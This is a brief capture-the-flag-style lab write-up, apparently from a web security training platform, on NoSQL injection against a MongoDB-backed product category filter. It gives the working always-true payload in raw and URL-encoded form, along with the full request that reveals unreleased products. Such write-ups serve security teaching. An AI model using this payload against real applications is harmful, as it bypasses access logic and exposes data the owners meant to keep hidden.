## 1. Initial reconnaissance
The `/filter?category=` endpoint controls which products are shown. Testing different category values shows that the backend queries MongoDB.

## 2. Testing methodology
Injected logical expressions to test whether user input affects query logic. Payloads like `'||'1'=='1` were used to observe changes in application behavior.

## 3. Payload construction
To force the query to always be true:
```
Gifts'||'1'=='1
```
URL-encoded form:
```
Gifts'||'1'%3D%3D'1
```

## 4. Completing the attack
Sending:
```
/filter?category=Gifts'||'1'%3D%3D'1
```
caused the backend to evaluate the condition as always-true, displaying unreleased products and solving the lab.
